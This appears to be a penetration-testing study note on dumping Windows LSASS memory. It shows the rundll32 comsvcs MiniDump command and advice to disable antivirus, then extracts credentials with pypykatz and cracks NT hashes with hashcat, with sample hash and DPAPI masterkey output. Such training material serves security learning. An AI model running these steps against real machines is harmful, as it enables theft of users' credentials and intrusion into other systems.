Process:
![[Pasted image 20240714173521.png|1200]]

Upon login LSASS will:
- Cache creds locally in memory
- Create [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

### Dumping LSASS Process Memory
#### Method 1: With GUI Access
1. Open Task Manager
2. Go to 'Processes' Tab
3. Find 'Local Security Authority Process'
4. Right-click and 'Create dump file'
	*a file called __lsass.DMP__ will be saved in `C:\Users\user\AppData\Local\Temp`*

#### Method 2: No GUI
***THIS IS RECOGNIZED AS MALICIOUS, DISABLE AV***

1. Find out ==lsass.exe== PID
```cmd
tasklist /svc
```
```powershell
Get-Process lsass
```
2. With an elevated shell create dump file
```cmd
rundll32 C:\windows\system32\comsvc.dll, MiniDump <PID> C:\lsass.dmp full
```

***FOR EXTRACTION TO HOST: [[Attacking SAM|Attacking SAM]]***

### Use Pypykatz to Extract Creds
On linux we can use [pypykats](https://github.com/skelsec/pypykatz) (play on Mimikatz, which is Windows only) to extract informtion from the ==lsass.dmp== file. Useful for offline cracking.

#### Run Pypykatz
We use LSA for ==local security authority== and specify ==minidump== as our data source, proceeded by the path to the dump file.
```bash
pypykatz lsa minidump /path/to/file.dmp
```

#### Output
##### MSV
```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

MSV is an authentication package that LSA calls to validate logon attempts against the SAM database.

##### WDIGEST
```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

WDIGEST is an older authentication protocol used by ==Windows XP - 8 and Windows Server 2003 - 2012==. These will be cleartext if present.

##### Kerberos
```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

Kerberos is authentication used in Active Directory. May be useful in accessing other systems on the domain.

##### DPAPI 
```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Short for ==Data Protection Application Programming Interface==, it's a set of APIs used to encrypt and decrypt DPAPI data blobs on a per-user basis. Some applications that use it are below.

| Program                   | Use of DPAPI                                                                  |
| ------------------------- | ----------------------------------------------------------------------------- |
| Internet Explorer         | Password form auto-completion                                                 |
| Google Chrome             | Password form auto-completion                                                 |
| Outlook                   | Passwords for email accounts                                                  |
| Remote Desktop Connection | Saved creds for connections to remote machines                                |
| Credential Manager        | Saved creds for accessing shared resources, wireless networks, VPNs, and more |
Pypykatz can extract the DPAPI ==masterkey== for the logged-on user who's in memory.


### Cracking hash with Hashcat
```bash
sudo hashcat -m 1000 <hash> <wordlist>
```

[[Attacking LSASS|Attacking LSASS]]